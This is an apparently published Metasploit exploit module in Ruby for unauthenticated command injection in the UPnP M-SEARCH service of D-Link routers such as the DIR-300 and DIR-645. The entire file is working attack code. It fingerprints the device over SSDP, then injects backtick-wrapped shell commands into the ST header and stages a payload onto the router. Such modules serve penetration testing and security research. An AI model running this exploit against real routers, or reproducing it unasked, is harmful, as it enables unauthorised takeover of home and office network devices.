# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;D-Link Unauthenticated UPnP M-SEARCH Multicast Command Injection&#039;,
      &#039;Description&#039; => %q{
        Different D-Link Routers are vulnerable to OS command injection via UPnP Multicast
        requests. This module has been tested on DIR-300 and DIR-645 devices. Zacharia Cutlip
        has initially reported the DIR-815 vulnerable. Probably there are other devices also
        affected.
      },
      &#039;Author&#039;      =>
        [
          &#039;Zachary Cutlip&#039;, # Vulnerability discovery and initial exploit
          &#039;Michael Messner <devnull[at]s3cur1ty.de>&#039; # Metasploit module and verification on other routers
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;URL&#039;, &#039;https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/upnp-command-injection&#039;], # original exploit
          [&#039;URL&#039;, &#039;http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html&#039;] # original exploit
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 01 2013&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039; =>
        [
          [ &#039;MIPS Little Endian&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039;     => ARCH_MIPSLE
            }
          ],
          [ &#039;MIPS Big Endian&#039;, # unknown if there are big endian devices out there
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039;     => ARCH_MIPS
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0
      ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(1900)
      ], self.class)

    deregister_options(&#039;CMDSTAGER::DECODER&#039;, &#039;CMDSTAGER::FLAVOR&#039;)
  end

  def check
    configure_socket

    pkt =
      "M-SEARCH * HTTP/1.1\r\n" +
      "Host:239.255.255.250:1900\r\n" +
      "ST:upnp:rootdevice\r\n" +
      "Man:\"ssdp:discover\"\r\n" +
      "MX:2\r\n\r\n"

    udp_sock.sendto(pkt, rhost, rport, 0)

    res = nil
    1.upto(5) do
      res,_,_ = udp_sock.recvfrom(65535, 1.0)
      break if res and res =~ /SERVER:\ Linux,\ UPnP\/1\.0,\ DIR-...\ Ver/mi
      udp_sock.sendto(pkt, rhost, rport, 0)
    end

    # UPnP response:
    # [*] 192.168.0.2:1900 SSDP Linux, UPnP/1.0, DIR-645 Ver 1.03 | http://192.168.0.2:49152/InternetGatewayDevice.xml | uuid:D02411C0-B070-6009-39C5-9094E4B34FD1::urn:schemas-upnp-org:device:InternetGatewayDevice:1
    # we do not check for the Device ID (DIR-645) and for the firmware version because there are different
    # dlink devices out there and we do not know all the vulnerable versions

    if res && res =~ /SERVER:\ Linux,\ UPnP\/1.0,\ DIR-...\ Ver/mi
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Unknown
  end

  def execute_command(cmd, opts)
    configure_socket

    pkt =
      "M-SEARCH * HTTP/1.1\r\n" +
      "Host:239.255.255.250:1900\r\n" +
      "ST:uuid:`#{cmd}`\r\n" +
      "Man:\"ssdp:discover\"\r\n" +
      "MX:2\r\n\r\n"

    udp_sock.sendto(pkt, rhost, rport, 0)
  end

  def exploit
    print_status("#{rhost}:#{rport} - Trying to access the device via UPnP ...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Failed to access the vulnerable device")
    end

    print_status("#{rhost}:#{rport} - Exploiting...")
    execute_cmdstager(
      :flavor  => :echo,
      :linemax => 950
    )
  end

  # the packet stuff was taken from the module miniupnpd_soap_bof.rb
  # We need an unconnected socket because SSDP replies often come
  # from a different sent port than the one we sent to. This also
  # breaks the standard UDP mixin.
  def configure_socket
    self.udp_sock = Rex::Socket::Udp.create({
      &#039;Context&#039;   => { &#039;Msf&#039; => framework, &#039;MsfExploit&#039; => self }
    })
    add_socket(self.udp_sock)
  end

  #
  # Required since we aren&#039;t using the normal mixins
  #

  def rhost
    datastore[&#039;RHOST&#039;]
  end

  def rport
    datastore[&#039;RPORT&#039;]
  end

  # Accessor for our UDP socket
  attr_accessor :udp_sock

end

